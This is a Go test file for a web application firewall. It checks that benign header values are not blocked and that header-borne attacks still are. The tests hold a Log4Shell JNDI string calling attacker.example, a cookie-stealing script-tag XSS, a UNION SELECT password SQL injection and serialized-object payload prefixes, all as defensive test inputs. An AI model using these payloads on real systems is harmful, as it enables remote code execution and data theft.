package engine

import (
	"net/http"
	"net/http/httptest"
	"testing"

	"wewaf/internal/clientip"
	"wewaf/internal/config"
	"wewaf/internal/core"
	"wewaf/internal/rules"
)

func headerTestEngine(t *testing.T) (*Engine, *clientip.Extractor) {
	t.Helper()
	cfg := config.Default()
	rs, err := rules.NewRuleSet(append(rules.DefaultRules(), rules.CRSRules()...))
	if err != nil {
		t.Fatalf("NewRuleSet: %v", err)
	}
	eng, err := NewEngine(cfg, rs, nil)
	if err != nil {
		t.Fatalf("NewEngine: %v", err)
	}
	ipx, _ := clientip.New(false, nil)
	return eng, ipx
}

func runHeaderReq(eng *Engine, ipx *clientip.Extractor, set func(*http.Request)) *core.Transaction {
	r := httptest.NewRequest("GET", "http://shop.example.com/products?id=42", nil)
	set(r)
	w := httptest.NewRecorder()
	tx := core.NewTransaction(w, r, ipx)
	eng.ProcessRequestHeaders(tx)
	eng.ProcessRequestBody(tx)
	return tx
}

// TestHeaderValuesNoFalsePositive guards the body-phase header-scan FP class.
// The engine inspects header values in the request-body phase (needed to catch
// Log4Shell-in-header and tag-XSS / UNION-SQLi in headers), but generic rules
// — `0x` hex, `${…}`, `char(…)`, PHP-serialized `a:1:{`, `$where`-style ops —
// match routine header content (ETags, cookies, opaque tokens). Those rules
// had their `headers` target pruned. This asserts a request carrying ALL of
// them is NOT blocked. (A live attack exercise originally surfaced this class.)
func TestHeaderValuesNoFalsePositive(t *testing.T) {
	eng, ipx := headerTestEngine(t)
	tx := runHeaderReq(eng, ipx, func(r *http.Request) {
		r.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0 Safari/537.36")
		r.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
		r.Header.Set("Accept-Language", "en-US,en;q=0.9")
		r.Header.Set("Accept-Encoding", "gzip, deflate, br")
		// Cookie carries every shape body-phase rules used to false-positive on:
		// ${} template, 0x hex token, PHP-serialized session, $where, char(),
		// base64-gzip (H4sIA), Java-serialized base64/hex (rO0AB / aced0005),
		// .NET-serialized base64 (AAEAAAD).
		r.Header.Set("Cookie", `session=abc123; tmpl=${USER}; tok=0xDEADBEEF1234; phpsess=a:1:{s:4:"name";s:5:"alice";}; q=$where; c=char(65,66); j=rO0ABXNyABFq; h=aced0005feed; n=AAEAAADxyz; z=H4sIAAAAAAAA`)
		r.Header.Set("If-None-Match", `"0x1a2b3c4d5e"`)
		// base64-gzip trace context — extremely common in production.
		r.Header.Set("X-Cloud-Trace-Context", "H4sIAAAAAAAAA0vLz1cIzs8tyEnVBQBQ0t5gDwAAAA")
		r.Header.Set("Baggage", "state=H4sIAAAAAAAA/ytJLS4BAAAA")
		r.Header.Set("Referer", "https://shop.example.com/build/0xdeadbeef99/page?redirect=/home&url=/next")
		r.Header.Set("Authorization", "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgN")
		r.Header.Set("Range", "bytes=0-1023")
	})
	if tx.IsBlocked() {
		var ids []string
		for _, m := range tx.MatchesSnapshot() {
			if m.Action == core.ActionBlock || m.Action == core.ActionDrop {
				ids = append(ids, m.RuleID+"("+m.Target+")")
			}
		}
		t.Fatalf("legit request with common header values was blocked (score=%d) by %v", tx.ScoreSnapshot(), ids)
	}
}

// TestHeaderBorneAttacksStillBlocked confirms the pruning above did NOT lose
// detection of genuine header-borne attacks — the reason the body phase scans
// headers at all. Log4Shell via User-Agent, a reflected <script> via Referer,
// and UNION SQLi via a custom header must all still block.
func TestHeaderBorneAttacksStillBlocked(t *testing.T) {
	eng, ipx := headerTestEngine(t)
	cases := []struct {
		name string
		set  func(*http.Request)
	}{
		{"log4shell_ua", func(r *http.Request) { r.Header.Set("User-Agent", "${jndi:ldap://attacker.example/a}") }},
		{"script_referer", func(r *http.Request) { r.Header.Set("Referer", "<script>alert(document.cookie)</script>") }},
		{"union_x_api", func(r *http.Request) { r.Header.Set("X-Api-Version", "1 UNION SELECT password FROM users") }},
	}
	for _, c := range cases {
		c := c
		t.Run(c.name, func(t *testing.T) {
			tx := runHeaderReq(eng, ipx, c.set)
			if !tx.IsBlocked() {
				t.Fatalf("header-borne attack %q was NOT blocked (score=%d)", c.name, tx.ScoreSnapshot())
			}
		})
	}
}

// TestSerializedPayloadBlocksInBody confirms that pruning the `headers` target
// from the deserialization rules (which false-positived on base64-gzip /
// serialized-looking header blobs) did NOT lose body detection — a Java/.NET
// serialized payload in the request BODY must still block.
func TestSerializedPayloadBlocksInBody(t *testing.T) {
	eng, ipx := headerTestEngine(t)
	bodies := map[string]string{
		"java_base64": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA",
		"java_hex":    "aced0005737200116a6176612e7574696c2e",
		"dotnet_b64":  "AAEAAAD/////AQAAAAAAAAAM",
	}
	for name, body := range bodies {
		name, body := name, body
		t.Run(name, func(t *testing.T) {
			r := httptest.NewRequest("POST", "http://shop.example.com/api", nil)
			w := httptest.NewRecorder()
			tx := core.NewTransaction(w, r, ipx)
			tx.SetMetadata("body", []byte(body))
			eng.ProcessRequestHeaders(tx)
			eng.ProcessRequestBody(tx)
			if !tx.IsBlocked() {
				t.Fatalf("serialized payload %q in body must still block (score=%d)", name, tx.ScoreSnapshot())
			}
		})
	}
}
